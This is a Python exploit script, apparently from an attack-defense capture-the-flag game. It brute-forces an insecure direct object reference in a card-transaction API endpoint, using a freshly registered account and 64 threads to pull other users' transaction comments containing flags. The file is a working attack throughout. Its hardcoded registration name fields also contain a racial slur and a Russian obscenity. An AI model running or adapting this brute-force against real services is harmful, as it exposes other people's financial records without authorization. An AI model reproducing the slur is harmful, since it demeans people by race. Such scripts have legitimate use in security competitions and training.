import requests
import string
import random
import sys
import re
import urllib
import urllib.parse
import time
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock


'''
Vuln: IDOR — GET /api/v1/card/<card_id>/transaction/<tx_id> retur   ns the
full transaction (with `comment` carrying the flag) without verifying
that the requester owns the card. To hit a transaction the (card_id,
tx_id) pair has to actually match the underlying row (the handler still
filters by card linkage); we brute the space.

'''

used_flags = []

EXECUTION_TIME = 25


DEFAULT_PORT = 8888
protocol = "http://"
card_id = 0
tx_id = 0

WORKERS = 64

MAX_CARD_ID = 500
MAX_TX_ID = 500

REQUEST_TIMEOUT = 3


login = "regnrrerthfjnr"
password = "wfn!@3mpdrmgmSSEdfsprgm"
FIRST_NAME = "suka_blyat"
SECOND_NAME = "nigger_bit_shataet_golovu"


FLAG_PATTERNS  = [
    re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I),
    re.compile(r"[A-Z0-9]{31}="),
]

def looks_like_flag(s: str) -> bool:
    return any(p.search(s) for p in FLAG_PATTERNS)


def save_last_ids(cid, tid):
    data = {
        'cid' : cid,
        'tid' : tid
    }
    with open('data.json', 'w') as f:
        json.dump(data, f, indent=4)
        print(f'saved! {cid} {tid}')


def load_last_ids():
    filename = 'data.json'

    if not os.path.exists(filename):

     if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump({}, f)

    with open(filename, 'r', encoding='utf-8') as f:
        return json.load(f)

def save_json(r):
    try:
        return r.json()
    except Exception:
        return None

def fetch(base, session, card_id, tx_id):
    try:
        r = session.get(f"{base}/api/v1/card/{card_id}/transaction/{tx_id}",
                    
                    timeout=REQUEST_TIMEOUT,
                )
        
    except requests.RequestException as e:
        log(f"[!!!] error while fetching: {e}")
        return None

    if r.status_code != 200 or not r.content:
        return None
    
    body = save_json(r)

    if isinstance(body, dict) and body:
        return body
    return None

def pairs(last_cid, last_tid):
    seen = set()
    seen_lock = Lock()


    for cid in range(last_cid, MAX_CARD_ID + 1):
        for tx in range(0, MAX_TX_ID + 1):
            key = (cid, tx)
            with seen_lock:
                if key in seen:
                    continue
                seen.add(key)
                yield key




def rand_str(n=10, alphabet = string.ascii_letters):
    return "".join(random.choice(alphabet) for i in range(n))

def log(msg):
    print(msg, file=sys.stderr, flush=True)


def registerORlogin(base):
    global ALREADY_REGISTERED, login, password
    s = requests.Session()
    s.headers["Connection"] = "keep-alive"
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=WORKERS, pool_maxsize =WORKERS, max_retries=0
    )

    s.mount("http://", adapter)

    login = rand_str(24)
    password = rand_str(24)

    try:
        r= s.post(f"{base}/api/v1/register",
            json={
                "login":login,
                "password":password,
                "first_name":FIRST_NAME,
                "second_name":SECOND_NAME,
            },
            timeout=REQUEST_TIMEOUT,
        )
        
        
    except requests.RequestException as e:
        log(f"[!] register failed, here's an error: {e}")

    

    
    try:
        r = s.post(f"{base}/api/v1/login",
                json={
                    "login":login,
                    "password":password,
                    },
                timeout=REQUEST_TIMEOUT,
            )
        cookies = requests.utils.cookiejar_from_dict(r.cookies.get_dict() )
        s.cookies.update(cookies)
        log(f"logged in")
    except requests.RequestException as e:
        log(f"[!] login failed, here's an error: {e}")

    cookies = requests.utils.cookiejar_from_dict(r.cookies.get_dict() )
    s.cookies.update(cookies)

    return s


def normalize(url: str) -> str:
    if "://" not in url:
        url = "http://" + url
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname or url
    port = parsed_url.port or DEFAULT_PORT

    return f"http://{host}:{port}"


def emit(text, printed_lock, printed):

    for pat in FLAG_PATTERNS:
        for hit in pat.findall(text):
            with printed_lock:
                if hit in printed:
                    continue
                printed.add(hit)
            print(hit, flush=True)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>", file=sys.stderr)
        sys.exit(1)

    base =normalize(sys.argv[1])
    session = registerORlogin(base)

    found_flags = set()
    found_flags_lock = Lock()
    printed_lock = Lock()
    printed = set()
    deadline = time.monotonic() + EXECUTION_TIME
    
    data = load_last_ids()

    last_cid = 0
    last_tid = 0
    if (data):
        last_cid = data['cid']
        last_tid = data['tid']
    
    


    def work(pair):
        nonlocal last_cid, last_tid
        cid, tx_id = pair
        body = fetch(base, session, cid, tx_id)


        if not isinstance(body, dict):
            return 

        
        comment = body.get("comment")
        if not isinstance(comment, str):
            return 
        with found_flags_lock:
            if comment in found_flags:
                return
            found_flags.add(comment)

        if (looks_like_flag(comment)):
            #print(f"{base}/api/v1/card/{cid}/transaction/{tx_id}")
            #print(body)
            emit(comment, printed_lock, printed )
  
            last_cid = cid
            last_tid = tx_id
            #print(f"new {last_cid} {last_tid}")

    


    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        try:
            for pair in pairs(last_cid, last_tid):
                if time.monotonic() > deadline:
                    break
                futures.append(pool.submit(work, pair))
                if len(futures) >= WORKERS * 10:
                    for i in as_completed(futures):
                        if time.monotonic() > deadline:
                            break
                        i.result()
                    futures = [ i for i in futures if not i.done()]
            for i in as_completed(futures):
                if time.monotonic() > deadline:
                    break
                i.result()
        finally:
            save_last_ids(last_cid, last_tid)
            print(f"Собрано флагов за раунд: {len(printed)}")
            for f in futures:
                f.cancel()

            
if __name__ == "__main__":
    main()